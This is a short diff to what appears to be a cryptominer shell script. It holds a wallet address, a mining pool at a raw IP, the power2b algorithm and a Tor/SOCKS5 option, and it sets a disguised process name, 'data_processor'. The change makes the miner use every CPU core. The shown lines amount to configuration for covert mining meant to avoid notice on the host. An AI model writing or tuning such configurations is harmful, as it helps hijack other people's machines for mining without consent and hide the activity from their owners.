@@ -8,7 +8,7 @@ FAKE_NAME="data_processor"
 WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
 POOL="stratum+tcps://104.248.150.108:9933"
 ALGO="power2b"
-THREADS=$(nproc)
+THREADS=$(nproc --all)
 
 USE_SOCKS5=false
 TOR_CMD=""
